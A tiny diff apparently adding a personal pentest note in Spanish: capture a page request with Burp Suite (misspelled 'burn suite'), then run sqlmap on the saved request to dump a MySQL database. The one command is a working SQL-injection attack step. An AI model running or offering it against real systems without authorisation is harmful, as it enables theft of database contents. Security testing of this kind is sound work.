@@ -1,0 +1,5 @@
+
+<><><><> hacer una copia de la pagina con burn suite<><><><><><>
+    
+    sudo sqlmap -r request.txt --dbms=mysql --dump
+
